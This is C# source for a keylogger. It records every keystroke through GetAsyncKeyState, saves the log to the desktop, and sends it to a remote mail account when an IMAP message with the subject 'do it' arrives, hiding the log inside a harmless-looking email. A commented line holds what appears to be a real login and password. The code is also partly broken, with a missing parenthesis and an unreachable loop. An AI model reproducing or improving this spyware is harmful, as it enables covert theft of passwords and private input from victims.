using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Net.Mail;
using ImapX;

namespace kl
{
    class Program
    {
        /* wtf
        public event ResolveEventHandler AssemblyResolve;


        AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
        {
            String resourceName = “ImapX.” +
            new AssemblyName(args.Name).Name + “.dll”;
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                Byte[] assemblyData = new Byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        };
         */

        // Some weird trick from stackoverflow to hide the console applicaiton. Edit: this doesn't work
        /* [DllImport("kernel32.dll")]
        public static extern bool FreeConsole(); */

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        static void Main(string[] args)
        {
            

            string logPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\keyLog.txt";
            StringBuilder logString = new StringBuilder();

            // email SEND thing below
            SmtpClient SmtpServer = new SmtpClient("mail.cock.li");
            MailMessage mail = new MailMessage();

            mail.From = new System.Net.Mail.MailAddress("cock li email receiver");
            mail.To.Add("commander email");
            mail.Subject = "so, about that coffe...";
            mail.Body = "it was nice, thankyou";

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("cock li email", "pw");
            SmtpServer.EnableSsl = true;
            // end email SEND thing

            // email RECEIVE thing below
            var imapClient = new ImapClient("mail.cock.li", true);

            /*
            if (imapClient.Connect()) Console.WriteLine("connect successful to imap");
            if (imapClient.Login("whoanice@national.shitposting.agency", "br0-ded_")) Console.WriteLine("login succesful to imap");
             */

            imapClient.Connect();
            imapClient.Login("cock li email receiver", "pw";

            /*imapClient.Folders.Inbox.OnNewMessagesArrived += Folder_OnNewMessagesArrived;
            imapClient.Folders.Inbox.StartIdling();

            //???? imapClient.Folders.Inbox.Messages.Download();

            imapClient.Behavior.MessageFetchMode = ImapX.Enums.MessageFetchMode.Tiny;*/

            /* var inbox = imapClient.Folders.Inbox;

            inbox.Messages.Download(); */



            /* ImapX.Message msg;
            string msgString;

            msg = imapClient.Folders.Inbox.Messages.; */



            // end email RECEIVE thing

            imapClient.Folders.Inbox.OnNewMessagesArrived += Folder_OnNewMessagesArrived;
            imapClient.Folders.Inbox.StartIdling();

            // var msgs = imapClient.Folders.Inbox.Messages;

            void Folder_OnNewMessagesArrived(object sender, IdleEventArgs e)
            {

                if ((e.Messages[0].Subject == "do it") && (e.Messages[0].Seen == false)) // If first message is requesting for data and wasn't seen yet, then send data and mark it seen.
                {
                    // Console.WriteLine("SENDING DATA");
                    e.Messages[0].Seen = true;
                    mail.Body += "\n\n" + logString.ToString();
                    SmtpServer.Send(mail);
                }

                /* else
                {
                    Console.WriteLine("nope"); // No request for data was seen.
                } */
            }


            while (true)
            {
                while (true) // Old implementation: for (int tCounter = 0; tCounter < 500; tCounter++)
                {
                    // Each 10 millisecs check for key presses.
                    Thread.Sleep(10);

                    for (int i = 8; i < 127; i++)
                    {
                        if (GetAsyncKeyState(i) == -32767)
                        {

                            switch (i)
                            {
                                case 13: // enter
                                    logString.Append("[EN]");
                                    break;

                                case 8: // backspace
                                    logString.Append("[BS]");
                                    break;

                                case 16: // shift
                                    logString.Append("[SH]");
                                    break;

                                default:
                                    logString.Append(Char.ToLower((char)i));
                                    break;
                            }

                            File.WriteAllText(logPath, logString.ToString());
                        }
                    }
                    // end
                }

                // Each 5 secs check for request for data. 5 secs accumulate by running the 10 secs timer 500 times.
                // imapClient.Folders.Inbox.Messages.Download();

                // end
            }
        }
    }
}
